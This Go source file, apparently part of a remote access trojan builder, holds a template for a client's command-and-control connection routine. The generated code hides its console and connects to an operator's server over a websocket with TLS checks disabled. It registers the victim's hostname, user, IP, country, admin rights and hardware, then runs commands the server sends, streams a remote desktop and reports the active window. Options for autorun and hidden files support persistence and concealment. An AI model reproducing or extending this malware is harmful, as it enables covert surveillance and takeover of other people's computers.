package buildergen

import "strings"

func templateConnect() string {
	return strings.TrimSpace(`
func waitForNetwork() {
	for !hasNetwork() {
		time.Sleep(3 * time.Second)
	}
}

func connectToServer() {
	log.Println("[connect] starting connectToServer")
	hideConsole()

	if offlineModeEnabled {
		log.Println("[connect] offline mode enabled, waiting for network")
		waitForNetwork()
	}

	serverHost := getServerHost()
	log.Println("[connect] serverHost=", serverHost)
	if strings.TrimSpace(serverHost) == "" {
		log.Println("[connect] ERROR: empty serverHost, exiting")
		return
	}

	wsScheme := strings.TrimSpace(getWsScheme())
	if wsScheme == "" {
		wsScheme = "ws"
	}
	log.Println("[connect] wsScheme=", wsScheme)

	wsPath := getWsPath()
	if wsPath == "" {
		wsPath = "/ws"
	}
	log.Println("[connect] wsPath=", wsPath)

	u := url.URL{Scheme: wsScheme, Host: serverHost, Path: wsPath}
	log.Println("[connect] wsURL=", u.String())

	header := http.Header{}
	if token := getBuilderToken(); len(token) != 0 {
		header.Add(getBuilderTokenHeader(), string(token))
		log.Println("[connect] added builder token, len=", len(token))
	}

	dialer := &websocket.Dialer{
		HandshakeTimeout: 15 * time.Second,
	}
	if wsScheme == "wss" {
		dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
		log.Println("[connect] using wss with InsecureSkipVerify")
	}

	log.Println("[connect] dialing...")
	conn, _, err := dialer.Dial(u.String(), header)
	if err != nil {
		log.Println("[connect] ERROR: dial failed, err=", err)
		return
	}
	defer conn.Close()
	log.Println("[connect] connected successfully!")

	hostname, _ := os.Hostname()
	userName := getUserName()
	ownerName := getOwnerName()
	buildID := getBuildID()
	id := fmt.Sprintf("%s_%s_%s", hostname, strings.TrimSpace(ownerName), strings.TrimSpace(buildID))
	adminFlag := isAdmin()
	publicIP := getPublicIP()
	country := getCountryByIP(publicIP)

	log.Println("[connect] preparing registerMsg id=", id)
	log.Println("[connect] hostname=", hostname, "user=", userName, "owner=", ownerName)
	log.Println("[connect] buildID=", buildID, "admin=", adminFlag)
	log.Println("[connect] publicIP=", publicIP, "country=", country)

	registerMsg := map[string]interface{}{
		"type":                "register",
		"id":                  id,
		"hostname":            hostname,
		"user":                userName,
		"ip":                  publicIP,
		"cpu":                 getCPUInfo(),
		"gpu":                 getGPUInfo(),
		"ram":                 getRAMInfo(),
		"owner":               ownerName,
		"buildId":             buildID,
		"version":             buildID,
		"os":                  getOSName(),
		"admin":               adminFlag,
		"deviceType":          getDeviceType(),
		"country":             country,
		"comment":             getBuildComment(),
		"startupDelaySeconds": startupDelaySeconds,
		"autorunMode":         autorunMode,
		"installPath":         customInstallPath,
		"hideFilesEnabled":    hideFilesEnabled,
	}

	log.Println("[connect] sending register message...")
	if err := wsWriteJSON(conn, registerMsg); err != nil {
		log.Println("[connect] ERROR: failed to send register, err=", err)
		return
	}
	log.Println("[connect] register message sent successfully")

	go func() {
		for {
			_, message, err := conn.ReadMessage()
			if err != nil {
				return
			}

			var msg map[string]interface{}
			if err := json.Unmarshal(message, &msg); err != nil {
				continue
			}

			typeVal, _ := msg["type"].(string)
			switch typeVal {
			case "command":
				cmdStr, _ := msg["command"].(string)
				if cmdStr != "" {
					go handleServerCommand(conn, id, cmdStr)
				}
			case "rd_start":
				fpsVal, _ := msg["fps"].(float64)
				resVal, _ := msg["resolution_percent"].(float64)
				go startRemoteDesktop(conn, id, int(fpsVal), int(resVal))
			case "rd_stop":
				go stopRemoteDesktop(conn, id)
			}
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	pingTicker := time.NewTicker(15 * time.Second)
	defer pingTicker.Stop()

	for {
		select {
		case <-ticker.C:
			updateData := map[string]interface{}{
				"type":   "update",
				"id":     id,
				"window": getActiveWindow(),
			}
			updated, _ := json.Marshal(updateData)
			if err := wsWriteText(conn, updated); err != nil {
				return
			}

		case <-pingTicker.C:
			if !hasNetwork() {
				continue
			}
			pingData := map[string]interface{}{"type": "ping"}
			pingMsg, _ := json.Marshal(pingData)
			if err := wsWriteText(conn, pingMsg); err != nil {
				return
			}
		}
	}
}
`)
}